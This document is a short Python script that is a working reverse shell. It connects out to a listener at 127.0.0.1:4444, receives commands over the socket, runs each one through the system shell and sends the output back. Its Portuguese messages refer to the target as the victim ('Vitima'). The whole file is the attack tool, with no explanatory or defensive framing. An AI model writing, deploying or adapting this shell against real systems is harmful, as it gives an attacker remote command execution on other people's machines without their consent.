import socket
import subprocess
target_host = '127.0.0.1'
target_port = 4444
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_host, target_port))
print(f"Conectado a {target_host}:{target_port}")    
try:
    while True:
        command = sock.recv(4096).decode()
        if command.lower() == 'exit':
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
            sock.send(output)
        except Exception as e:
            sock.send(str(e).encode())
except ConnectionAbortedError:
    print("A Vitima encerrou o host remoto.")
finally:
    sock.close()